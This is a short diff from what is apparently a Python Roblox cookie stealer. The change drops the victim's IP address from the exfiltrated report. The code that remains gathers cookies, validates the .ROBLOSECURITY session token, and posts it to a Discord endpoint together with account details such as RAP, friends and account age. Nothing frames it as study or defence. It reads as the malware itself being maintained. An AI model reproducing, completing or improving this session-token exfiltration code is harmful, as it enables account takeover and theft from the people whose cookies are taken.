@@ -75,8 +75,6 @@ def cookieLogger():
 
 
 cookies = cookieLogger()
-
-ip_address = requests.get("https://api.ipify.org/").text
 roblox_cookie = cookies[1]
 isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
 
@@ -119,7 +117,6 @@ discord.post(
                 {"name" : "RAP", "value": rap,"inline": True},
                 {"name" : "Friends", "value": friends, "inline": True},
                 {"name" : "Account Age", "value": age, "inline": True},
-                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                 {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
             ],
             "thumbnail": {"url": headshot},
